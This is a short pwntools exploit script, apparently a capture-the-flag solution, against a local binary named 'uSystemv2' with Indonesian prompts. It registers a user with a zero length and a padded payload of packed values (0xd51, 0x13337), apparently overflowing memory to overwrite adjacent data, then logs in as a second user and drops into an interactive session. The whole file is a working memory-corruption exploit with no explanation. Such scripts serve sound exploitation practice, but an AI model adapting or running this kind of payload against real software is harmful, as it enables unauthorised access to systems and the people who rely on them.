from pwn import *

context.terminal = "tmux splitw -h".split()
context.binary = elf = ELF("uSystemv2")

p = elf.process()
#gdb.attach(p)

def register(data, length):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"Panjang username: ", str(length).encode())
    p.sendlineafter(b"Username: ", data)

def login(data):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"Username: ", data)

payload = b"A" * 20
payload += p64(0xd51)
payload += p64(0x13337)

register(payload, 0)
register(b"lol", 4)
login(b"lol")

p.interactive()
